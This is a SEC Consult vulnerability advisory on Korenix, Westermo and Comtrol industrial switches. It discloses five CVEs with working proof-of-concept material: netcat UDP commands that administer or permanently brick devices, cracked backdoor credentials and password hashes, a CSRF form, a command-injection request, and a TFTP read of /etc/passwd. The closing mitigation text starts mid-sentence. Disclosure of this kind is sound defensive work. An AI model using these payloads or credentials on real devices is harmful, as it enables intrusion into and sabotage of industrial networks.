Business recommendation:
------------------------
SEC Consult recommends to perform a thorough security review conducted by
security professionals to identify and resolve potential further critical
security issues.


Vulnerability overview/description:
-----------------------------------
1) Unauthenticated Device Administration (CVE-2020-12500)
Korenix, Westermo (members of the Beijer Group) and Comtrol (Pepperl+Fuchs) are
sharing a partially similar firmware base for the industrial devices. They can
be managed via a Windows client program called "Korenix View" or "Jet View".
This program communicates in plaintext via UDP. All messages that are sent to
the device are broadcastet in the whole subnet and the answers from the devices
are send back via broadcast too.
The older version of this management program, called "cmd-server2", can be
controlled without a password. Analyzing the newer version, called
"jetviewd", indicates that some kind of password can be set. But this is not
part of the default configuration.

Actions that can be done via this daemon, listening on UDP port 5010, are:
  * Modifying networking settings (IP, netmask, gateway)
  * Initiating self tests and blink LEDs on the device
  * Triggering download and upload of configuration files (via TFTP)
  * Triggering uploads of new firmware and bootloader files (via TFTP)

The device can also be bricked via this daemon so that it is necessary to 
press
the reset button and re-configure the settings. This was tested on a physical
device, the JetNet 4706F.

2) Backdoor Accounts (CVE-2020-12501)
Multiple different backdoor accounts were found during quick security checks
of different firmware files. One backdoor account was tested on a later bought
device to verify this specific finding.

3) Cross-Site Request Forgery (CSRF) (CVE-2020-12502)
The web interface, that is used to set all configurations, is vulnerable to
cross-site request forgery attacks. An attacker can change settings via this
way by luring the victim to a malicious website.

4) Semi-Blind Authenticated Command Injection (CVE-2020-12503)
A semi-blind command injection vulnerabilities were found on the device series
"JetNet" and the "Westermo PMI-110-F2G Managed PoE Gigabit Switch".

They are partially sharing the same firmware base. Therefore, the payloads to
exploit those command injections are similar. Due to the lack of CSRF
protection, an attacker can execute arbitrary commands on the device by luring
the victim to click on a malicious link.

5) Arbitrary Unauthenticated TFTP Actions (CVE-2020-12504)
A TFTP service is present on a broad range of devices for firmware-,
bootloader-, and configuration-uploads/downloads. This TFTP server can be
abused to read all files from the system as the daemon runs as root which
results in a password hash exposure via the file /etc/passwd. Write access is
restricted to certain files (configuration, certificates, boot loader,
firmware upgrade) though.

By uploading malicious Quagga config-files an attacker can modify e.g.
IP-settings of the device. Malicious firmware and bootloader uploads are
possible too.


Proof of concept:
-----------------
1) Unauthenticated Device Administration (CVE-2020-12500)
All commands can be sent via UDP port 5010.

Device discovery (firmware/bootloader version etc. in response):
echo -e "\x00\x00\x00\x07\x00\x00\x00\x04\x00\x00\x00\x01" | nc -u $IP 5010

Blink with leds:
echo -e "\x00\x00\x00\x5b\x00\x00\x00\x01\x01" | nc -u $IP 5010

Permanent denial of service. The device is only available after pressing the
reset button to load the default config:
echo -e "\x00\x00\x00\x1f\x01\x01\x01\x04\x01\x01\x01\x01" | nc -u $IP 5010

Present on:
  * Korenix JetNet (Multiple devices)
  * Westermo PMI-110-F2G
  * Comtrol RocketLinx (Multiple devices)

2) Backdoor Accounts (CVE-2020-12501)
The following accounts are available on different devices of Korenix. There
might be more affected devices across this vendor. Westermo and Comtrol devices
may be affected too.

* User "kn001277", present on:
  - JetNet 4706f
  - JetNet 4706
    More devices may be affected.

Three users are present on the system according to "/etc/passwd". The hashes
were cracked and assigned to each user:
admin:admin
root:ilovekor
kn001277:vup2u04

By inspecting "/etc/passwd", the only user that is allowed to login
to the device on the real shell (/bin/sh) is "kn001277":
root:heGjODbadxtNw:0:0:root:/home:/bin/vtysh
[...]
kn001277:WcAXxIMgSqAhs:0:0:kn001277:/home:/bin/sh
[...]
admin:Dju8a52uMhbg.:0:0:root:/home:/bin/vtysh

The credentials were tested on a real device and they worked.

3) Cross-Site Request Forgery (CSRF) (CVE-2020-12502)
The following CSRF PoC can be used to ping 127.0.0.1. All other actions in the
context of the menu, like uploading config files, can be done in the same 
way:
-------------------------------------------------------------------------------
<html>
   <body>
   <script>history.pushState('', '', '/')</script>
     <form action="http://$IP/goform/formping" method="POST">
       <input type="hidden" name="PingIPAddress" value="127.0.0.1" />
       <input type="hidden" name="submit-url" value="/toolping.asp" 
/>
       <input type="hidden" name="Submit" value="Ping" />
       <input type="submit" value="Submit request" />
     </form>
   </body>
</html>
-------------------------------------------------------------------------------

4) Semi-Blind Authenticated Command Injection (CVE-2020-12503)
The following command injection works on the devices:
  * Korenix JetNet (Multiple devices)
  * Comtrol RocketLinx (Multiple devices)
  * Westermo PMI-110-F2G

The ping functionality in the web-interfaces can be abused to inject system
commands in a semi-blind way. Two requests must be sent to the service to
retrieve the output of the command injection.

The first request is a POST-request to the endpoint /goform/formping:
-------------------------------------------------------------------------------
POST /goform/formping HTTP/1.1
Host: $IP
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Connection: close
Cookie: -common-web-session-=::webs.session::9c10b4b1b22063e7fcba5369ff86e779
Upgrade-Insecure-Requests: 1
  
PingIPAddress=;id;&submit-url=%2Ftoolping.asp&Submit=Ping
-------------------------------------------------------------------------------
This request triggers the actual command injection in a blind way. The output
can be fetched from the system by using the following GET-request after
triggering the previous POST-request:
-------------------------------------------------------------------------------
GET //toolping.asp HTTP/1.1
Host: $IP
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: -common-web-session-=::webs.session::9c10b4b1b22063e7fcba5369ff86e779
Upgrade-Insecure-Requests: 1
-------------------------------------------------------------------------------

5) Arbitrary TFTP Actions (CVE-2020-12504)
The Linux TFTP client was used to download files from the system using
absolute paths. Uploads were only possible on existing paths like:
/home/Quagga.conf
/home/bootloader.bin

To download the /etc/passwd file from the system, the following
command was invoked:
[user@...alhost ~]$ tftp -m binary <Target-IP> -c get /etc/passwd
[user@...alhost ~]$ cat passwd
root:heGjODbadxtNw:0:0:root:/home:/bin/vtysh
bin:*:1:1:bin:/bin:
daemon:*:2:2:daemon:/usr/sbin:
sys:*:3:3:sys:/dev:
adm:*:4:4:adm:/var/adm:
lp:*:5:7:lp:/var/spool/lpd:

uucp:*:11:13:uucp:/var/spool/uucp:
kn001277:WcAXxIMgSqAhs:0:0:kn001277:/home:/bin/sh
operator:*:12:0:operator:/root:
games:*:13:100:games:/usr/games:

nobody:*:65534:65534:nobody:/home:/bin/sh
admin:Dju8a52uMhbg.:0:0:root:/home:/bin/vtysh

Present on:
  * Korenix JetNet (Multiple devices)
  * Comtrol RocketLinx (Multiple devices)
  * Westermo PMI-110-F2G

practices and firewall configurations that can help protect devices from
attacks that originate from outside the network. Such practices might include:
  * Restrict physical access to device to authorized personnel,
  * Do not have direct connections to the Internet,
  * Separate from other networks by means of a firewall system with a minimal
    number of exposed ports,
  * Portable computers and removable storage media should be carefully scanned
    for viruses before they are connected to those devices.
For additional information and support please contact the local Korenix service
organization. For contact information, see:
